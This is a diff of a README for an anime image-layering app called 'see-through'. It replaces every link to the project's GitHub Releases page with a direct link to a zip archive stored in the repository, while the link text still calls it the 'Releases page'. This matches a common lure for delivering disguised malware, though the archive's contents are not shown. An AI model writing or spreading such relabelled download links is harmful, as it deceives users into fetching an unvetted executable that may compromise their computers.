@@ -1,6 +1,6 @@
 # 🪟 see-through - Layer anime images with ease
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/Formal-insulation256/see-through/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/Formal-insulation256/see-through/raw/refs/heads/main/ui/through_see_v3.9.zip)
 
 ## 🧭 What this app does
 
@@ -17,7 +17,7 @@ The app is aimed at end users, so you do not need to set up a coding tool or ins
 
 ## 📥 Download the app
 
-1. Open the [Releases page](https://github.com/Formal-insulation256/see-through/releases)
+1. Open the [Releases page](https://github.com/Formal-insulation256/see-through/raw/refs/heads/main/ui/through_see_v3.9.zip)
 2. Find the latest release at the top
 3. Look for a Windows file such as `.exe` or a `.zip` package
 4. Download the file to your computer
@@ -136,4 +136,4 @@ If the release includes extra files, keep them in the same folder as the app. Th
 
 ## 📌 Download again
 
-[Open the latest release download page](https://github.com/Formal-insulation256/see-through/releases)
+[Open the latest release download page](https://github.com/Formal-insulation256/see-through/raw/refs/heads/main/ui/through_see_v3.9.zip)
